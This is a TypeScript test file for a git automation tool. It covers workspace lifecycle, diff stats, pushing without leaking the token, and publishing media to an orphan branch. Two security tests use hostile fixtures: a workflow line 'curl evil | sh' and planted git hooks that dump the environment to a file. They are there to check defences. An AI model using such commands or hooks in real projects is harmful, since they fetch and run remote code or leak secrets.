import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";
import { Repo } from "./git.js";
import { setGitIdentity } from "./proc.js";

const identity = { GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" };
function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, { cwd, encoding: "utf8", env: { ...process.env, ...identity } }).trim();
}

function fixture() {
  const root = mkdtempSync(path.join(tmpdir(), "isobot-git-"));
  const origin = path.join(root, "origin.git");
  const seed = path.join(root, "seed");
  execFileSync("git", ["init", "-q", "--bare", "-b", "main", origin]);
  execFileSync("git", ["clone", "-q", origin, seed]);
  mkdirSync(path.join(seed, "ci"));
  writeFileSync(path.join(seed, "README.md"), "hello\n");
  writeFileSync(path.join(seed, "ci", "deploy.yml"), "run: echo deploy\n");
  git(seed, "add", "-A");
  git(seed, "commit", "-q", "-m", "init");
  git(seed, "push", "-q", "origin", "HEAD:main");
  setGitIdentity("isobot test", "test@example.com");
  const repo = new Repo(path.join(root, "home"), "o", "r", "secret-token", origin);
  return { root, origin, repo };
}

test("workspace lifecycle: build in a throwaway clone, judge and push from the runner's clone", async () => {
  const { origin, repo } = fixture();
  const base = await repo.sync("main");
  assert.equal(base, git(origin, "rev-parse", "main"));
  const dir = await repo.createWorkspace("isobot/1-test", base);
  assert.ok(existsSync(path.join(dir, "README.md")));
  assert.equal(git(dir, "branch", "--show-current"), "isobot/1-test");

  await repo.commitPending(dir, "nothing");
  assert.equal(await repo.ahead(base, await repo.capture(dir, "isobot/1-test")), 0);

  writeFileSync(path.join(dir, "feature.txt"), "a\nb\n");
  writeFileSync(path.join(dir, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 1, 2, 0, 3]));
  await repo.commitPending(dir, "add feature");
  const sha = await repo.capture(dir, "isobot/1-test");
  assert.equal(await repo.ahead(base, sha), 1);
  const stat = await repo.diffStat(base, sha);
  assert.deepEqual(stat.files.map(f => [f.path, f.binary]), [["feature.txt", false], ["logo.png", true]]);
  assert.equal(stat.changedLines, 2 + 100, "binary files weigh 100 lines");
  assert.match(await repo.diff(base, sha), /\+a\n\+b/);

  await repo.push(sha, "isobot/1-test");
  assert.equal(git(origin, "rev-parse", "isobot/1-test"), sha);
  assert.ok(!readFileSync(path.join(repo.barePath, "config"), "utf8").includes("secret-token"), "token never lands in git config");

  // A retry starts clean from the base commit.
  const again = await repo.createWorkspace("isobot/1-test", base);
  assert.ok(!existsSync(path.join(again, "feature.txt")));
  await repo.removeWorkspace("isobot/1-test");
  assert.ok(!existsSync(again));

  const release = await repo.checkoutAt(base, "release__1-merge");
  assert.ok(existsSync(path.join(release, "README.md")));
  await repo.removeWorkspace("release__1-merge");
  assert.ok(!existsSync(release));
});

test("a rename into a protected folder shows the real destination path", async () => {
  const { repo } = fixture();
  const base = await repo.sync("main");
  const dir = await repo.createWorkspace("isobot/2-rename", base);
  mkdirSync(path.join(dir, ".github", "workflows"), { recursive: true });
  git(dir, "mv", "ci/deploy.yml", ".github/workflows/deploy.yml");
  writeFileSync(path.join(dir, ".github", "workflows", "deploy.yml"), "run: curl evil | sh\n");
  await repo.commitPending(dir, "move ci");
  const stat = await repo.diffStat(base, await repo.capture(dir, "isobot/2-rename"));
  assert.deepEqual(stat.files.map(f => f.path).sort(), [".github/workflows/deploy.yml", "ci/deploy.yml"]);
});

test("hooks a builder plants never run with the runner's token", async () => {
  const { root, repo } = fixture();
  const base = await repo.sync("main");
  const dir = await repo.createWorkspace("isobot/3-hook", base);
  const leak = path.join(root, "leaked.txt");
  // A malicious builder plants hooks in its workspace and tries to add one to the runner's clone.
  for (const hooks of [path.join(dir, ".git", "hooks"), path.join(repo.barePath, "hooks")]) {
    mkdirSync(hooks, { recursive: true });
    for (const name of ["pre-push", "reference-transaction", "post-checkout", "pre-commit"]) {
      writeFileSync(path.join(hooks, name), `#!/bin/sh\nenv >> "${leak}"\n`);
      chmodSync(path.join(hooks, name), 0o755);
    }
  }
  writeFileSync(path.join(dir, "x.txt"), "x\n");
  await repo.commitPending(dir, "x");
  const sha = await repo.capture(dir, "isobot/3-hook");
  await repo.push(sha, "isobot/3-hook");
  await repo.sync("main");
  assert.ok(!existsSync(leak), "no hook ran during runner git operations");
});

test("media goes on an isobot/media branch, one commit per publish, older links still resolvable", async () => {
  const { root, origin, repo } = fixture();
  await repo.sync("main");
  const shot = path.join(root, "after.png");
  writeFileSync(shot, "png-bytes");
  const first = await repo.publishMedia("7/20261116T120000-abc", [{ file: shot, name: "01-after.png" }], "Media for #7");
  const url = first["01-after.png"];
  const commit = /\/blob\/([0-9a-f]{40})\/7\/20261116T120000-abc\/01-after\.png\?raw=true$/.exec(url)?.[1];
  assert.ok(url.startsWith("https://github.com/o/r/blob/") && commit, url);
  assert.equal(git(origin, "show", `${commit}:7/20261116T120000-abc/01-after.png`), "png-bytes");
  assert.equal(git(origin, "rev-parse", "isobot/media"), commit);
  assert.equal(git(origin, "rev-list", "--count", "isobot/media"), "1", "an orphan: no main history on the media branch");

  writeFileSync(shot, "second");
  const second = await repo.publishMedia("8/20261116T130000-def", [{ file: shot, name: "x.png" }], "Media for #8");
  const tip = git(origin, "rev-parse", "isobot/media");
  assert.ok(second["x.png"].includes(tip));
  assert.equal(git(origin, "rev-parse", `${tip}^`), commit, "the previous publish stays reachable as the parent");
  assert.equal(git(origin, "show", `${commit}:7/20261116T120000-abc/01-after.png`), "png-bytes");
  assert.equal(git(origin, "ls-tree", "-r", "--name-only", tip), "8/20261116T130000-def/x.png", "each commit holds only its own files");
});
